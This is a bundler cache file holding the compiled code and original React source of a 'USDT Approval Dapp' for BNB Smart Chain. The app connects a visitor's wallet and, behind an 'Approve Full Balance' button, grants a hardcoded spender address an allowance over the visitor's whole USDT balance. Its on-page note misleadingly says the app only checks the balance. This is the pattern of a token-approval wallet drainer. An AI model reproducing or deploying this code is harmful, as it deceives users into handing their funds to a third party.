{"ast":null,"code":"var _jsxFileName = \"/Users/aryan/Documents/frontend/src/App.js\",\n  _s = $RefreshSig$();\nimport React, { useState, useEffect } from \"react\";\nimport { ethers } from \"ethers\";\nimport { jsxDEV as _jsxDEV, Fragment as _Fragment } from \"react/jsx-dev-runtime\";\nconst USDT_ADDRESS = \"0x55d398326f99059fF775485246999027B3197955\";\nconst SPENDER_ADDRESS = \"0x64FaeC69187a1a24A36F6590f0f8F94F68b044ee\";\nconst USDT_ABI = [\"function approve(address spender, uint256 amount) public returns (bool)\", \"function allowance(address owner, address spender) public view returns (uint256)\", \"function balanceOf(address owner) view returns (uint256)\", \"function decimals() view returns (uint8)\"];\nexport default function App() {\n  _s();\n  const [provider, setProvider] = useState(null);\n  const [signer, setSigner] = useState(null);\n  const [account, setAccount] = useState(null);\n  const [usdtContract, setUsdtContract] = useState(null);\n  const [balance, setBalance] = useState(\"0\");\n  const [decimals, setDecimals] = useState(18);\n  const [allowance, setAllowance] = useState(\"0\");\n  const [isApproving, setIsApproving] = useState(false);\n  useEffect(() => {\n    if (window.ethereum) {\n      const prov = new ethers.BrowserProvider(window.ethereum);\n      setProvider(prov);\n    } else {\n      alert(\"Please install MetaMask!\");\n    }\n  }, []);\n  async function connectWallet() {\n    if (!provider) return;\n    const accounts = await provider.send(\"eth_requestAccounts\", []);\n    const signer = await provider.getSigner();\n    setSigner(signer);\n    setAccount(accounts[0]);\n    const contract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);\n    setUsdtContract(contract);\n    const dec = await contract.decimals();\n    setDecimals(dec);\n    updateBalanceAndAllowance(accounts[0], contract);\n  }\n  async function updateBalanceAndAllowance(user, contract) {\n    const rawBalance = await contract.balanceOf(user);\n    const formattedBalance = ethers.formatUnits(rawBalance, decimals);\n    setBalance(formattedBalance);\n    const rawAllowance = await contract.allowance(user, SPENDER_ADDRESS);\n    setAllowance(rawAllowance.toString());\n  }\n  async function approveFullBalance() {\n    if (!usdtContract || !account) return;\n    setIsApproving(true);\n    try {\n      const rawBalance = await usdtContract.balanceOf(account);\n      const tx = await usdtContract.approve(SPENDER_ADDRESS, rawBalance);\n      await tx.wait();\n      alert(\"Approval successful!\");\n      updateBalanceAndAllowance(account, usdtContract);\n    } catch (err) {\n      alert(\"Approval failed: \" + err.message);\n    }\n    setIsApproving(false);\n  }\n  return /*#__PURE__*/_jsxDEV(\"div\", {\n    style: {\n      padding: 20\n    },\n    children: [/*#__PURE__*/_jsxDEV(\"h2\", {\n      children: \"BNB Smart Chain USDT Approval Dapp\"\n    }, void 0, false, {\n      fileName: _jsxFileName,\n      lineNumber: 77,\n      columnNumber: 7\n    }, this), !account ? /*#__PURE__*/_jsxDEV(\"button\", {\n      onClick: connectWallet,\n      children: \"Connect Wallet\"\n    }, void 0, false, {\n      fileName: _jsxFileName,\n      lineNumber: 79,\n      columnNumber: 9\n    }, this) : /*#__PURE__*/_jsxDEV(_Fragment, {\n      children: [/*#__PURE__*/_jsxDEV(\"p\", {\n        children: [\"Connected account: \", account]\n      }, void 0, true, {\n        fileName: _jsxFileName,\n        lineNumber: 82,\n        columnNumber: 11\n      }, this), /*#__PURE__*/_jsxDEV(\"p\", {\n        children: [\"USDT Balance: \", balance, \" USDT \", /*#__PURE__*/_jsxDEV(\"br\", {}, void 0, false, {\n          fileName: _jsxFileName,\n          lineNumber: 84,\n          columnNumber: 42\n        }, this), \"Approved Allowance to Spender: \", ethers.formatUnits(allowance, decimals), \" USDT\"]\n      }, void 0, true, {\n        fileName: _jsxFileName,\n        lineNumber: 83,\n        columnNumber: 11\n      }, this), /*#__PURE__*/_jsxDEV(\"button\", {\n        onClick: approveFullBalance,\n        disabled: isApproving,\n        children: isApproving ? \"Approving...\" : \"Approve Full Balance\"\n      }, void 0, false, {\n        fileName: _jsxFileName,\n        lineNumber: 87,\n        columnNumber: 11\n      }, this), /*#__PURE__*/_jsxDEV(\"p\", {\n        style: {\n          marginTop: 20,\n          fontSize: 12,\n          color: \"#888\"\n        },\n        children: [\"* Note: This app checks your full USDT balance for the current times: \", /*#__PURE__*/_jsxDEV(\"br\", {}, void 0, false, {\n          fileName: _jsxFileName,\n          lineNumber: 91,\n          columnNumber: 83\n        }, this), /*#__PURE__*/_jsxDEV(\"b\", {\n          children: SPENDER_ADDRESS\n        }, void 0, false, {\n          fileName: _jsxFileName,\n          lineNumber: 92,\n          columnNumber: 13\n        }, this)]\n      }, void 0, true, {\n        fileName: _jsxFileName,\n        lineNumber: 90,\n        columnNumber: 11\n      }, this)]\n    }, void 0, true)]\n  }, void 0, true, {\n    fileName: _jsxFileName,\n    lineNumber: 76,\n    columnNumber: 5\n  }, this);\n}\n_s(App, \"QDi1vzPiOoa0z5m5DA5ELvJoEwk=\");\n_c = App;\nvar _c;\n$RefreshReg$(_c, \"App\");","map":{"version":3,"names":["React","useState","useEffect","ethers","jsxDEV","_jsxDEV","Fragment","_Fragment","USDT_ADDRESS","SPENDER_ADDRESS","USDT_ABI","App","_s","provider","setProvider","signer","setSigner","account","setAccount","usdtContract","setUsdtContract","balance","setBalance","decimals","setDecimals","allowance","setAllowance","isApproving","setIsApproving","window","ethereum","prov","BrowserProvider","alert","connectWallet","accounts","send","getSigner","contract","Contract","dec","updateBalanceAndAllowance","user","rawBalance","balanceOf","formattedBalance","formatUnits","rawAllowance","toString","approveFullBalance","tx","approve","wait","err","message","style","padding","children","fileName","_jsxFileName","lineNumber","columnNumber","onClick","disabled","marginTop","fontSize","color","_c","$RefreshReg$"],"sources":["/Users/aryan/Documents/frontend/src/App.js"],"sourcesContent":["import React, { useState, useEffect } from \"react\";\nimport { ethers } from \"ethers\";\n\nconst USDT_ADDRESS = \"0x55d398326f99059fF775485246999027B3197955\";\nconst SPENDER_ADDRESS = \"0x64FaeC69187a1a24A36F6590f0f8F94F68b044ee\";\n\nconst USDT_ABI = [\n  \"function approve(address spender, uint256 amount) public returns (bool)\",\n  \"function allowance(address owner, address spender) public view returns (uint256)\",\n  \"function balanceOf(address owner) view returns (uint256)\",\n  \"function decimals() view returns (uint8)\",\n];\n\nexport default function App() {\n  const [provider, setProvider] = useState(null);\n  const [signer, setSigner] = useState(null);\n  const [account, setAccount] = useState(null);\n  const [usdtContract, setUsdtContract] = useState(null);\n  const [balance, setBalance] = useState(\"0\");\n  const [decimals, setDecimals] = useState(18);\n  const [allowance, setAllowance] = useState(\"0\");\n  const [isApproving, setIsApproving] = useState(false);\n\n  useEffect(() => {\n    if (window.ethereum) {\n      const prov = new ethers.BrowserProvider(window.ethereum);\n      setProvider(prov);\n    } else {\n      alert(\"Please install MetaMask!\");\n    }\n  }, []);\n\n  async function connectWallet() {\n    if (!provider) return;\n    const accounts = await provider.send(\"eth_requestAccounts\", []);\n    const signer = await provider.getSigner();\n    setSigner(signer);\n    setAccount(accounts[0]);\n\n    const contract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);\n    setUsdtContract(contract);\n\n    const dec = await contract.decimals();\n    setDecimals(dec);\n\n    updateBalanceAndAllowance(accounts[0], contract);\n  }\n\n  async function updateBalanceAndAllowance(user, contract) {\n    const rawBalance = await contract.balanceOf(user);\n    const formattedBalance = ethers.formatUnits(rawBalance, decimals);\n    setBalance(formattedBalance);\n\n    const rawAllowance = await contract.allowance(user, SPENDER_ADDRESS);\n    setAllowance(rawAllowance.toString());\n  }\n\n  async function approveFullBalance() {\n    if (!usdtContract || !account) return;\n    setIsApproving(true);\n\n    try {\n      const rawBalance = await usdtContract.balanceOf(account);\n      const tx = await usdtContract.approve(SPENDER_ADDRESS, rawBalance);\n      await tx.wait();\n      alert(\"Approval successful!\");\n      updateBalanceAndAllowance(account, usdtContract);\n    } catch (err) {\n      alert(\"Approval failed: \" + err.message);\n    }\n\n    setIsApproving(false);\n  }\n\n  return (\n    <div style={{ padding: 20 }}>\n      <h2>BNB Smart Chain USDT Approval Dapp</h2>\n      {!account ? (\n        <button onClick={connectWallet}>Connect Wallet</button>\n      ) : (\n        <>\n          <p>Connected account: {account}</p>\n          <p>\n            USDT Balance: {balance} USDT <br />\n            Approved Allowance to Spender: {ethers.formatUnits(allowance, decimals)} USDT\n          </p>\n          <button onClick={approveFullBalance} disabled={isApproving}>\n            {isApproving ? \"Approving...\" : \"Approve Full Balance\"}\n          </button>\n          <p style={{ marginTop: 20, fontSize: 12, color: \"#888\" }}>\n            * Note: This app checks your full USDT balance for the current times: <br />\n            <b>{SPENDER_ADDRESS}</b>\n          </p>\n        </>\n      )}\n    </div>\n  );\n}\n"],"mappings":"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","ignoreList":[]},"metadata":{},"sourceType":"module","externalDependencies":[]}